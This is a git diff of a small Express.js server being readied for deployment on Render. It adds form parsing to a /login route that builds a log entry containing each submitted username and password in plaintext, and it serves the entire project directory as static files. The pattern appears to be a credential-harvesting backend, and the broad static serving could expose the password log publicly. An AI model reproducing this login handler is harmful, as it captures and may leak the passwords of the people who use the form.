@@ -3,26 +3,31 @@ const fs = require("fs");
 const path = require("path");
 
 const app = express();
-const port = 3000;
 
+// ✅ Use the port Render gives you
+const port = process.env.PORT || 3000;
+
+// ✅ Middleware
 app.use(express.json());
-app.use(express.static(__dirname)); // allow access to files in current folder
+app.use(express.urlencoded({ extended: true })); // for form data
 
+// ✅ Serve static files (html, css, js)
+app.use(express.static(__dirname));
 
-// Serve static files (html, css, js) from current directory
+// ✅ Routes
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-app.get("/styles.css", (req, res) => {
-  res.sendFile(path.join(__dirname, "styles.css"));
+app.get("/main.css", (req, res) => {
+  res.sendFile(path.join(__dirname, "main.css"));
 });
 
 app.get("/script.js", (req, res) => {
   res.sendFile(path.join(__dirname, "script.js"));
 });
 
-// Handle POST request from form
+// ✅ Handle POST requests (e.g., login form)
 app.post("/login", (req, res) => {
   const { username, password } = req.body;
   const logEntry = `Username: ${username}, Password: ${password}\n`;
@@ -37,6 +42,7 @@ app.post("/login", (req, res) => {
   });
 });
 
+// ✅ Start server
 app.listen(port, () => {
-  console.log(`✅ Server running at http://localhost:${port}`);
+  console.log(`Server is running on port ${port}`);
 });
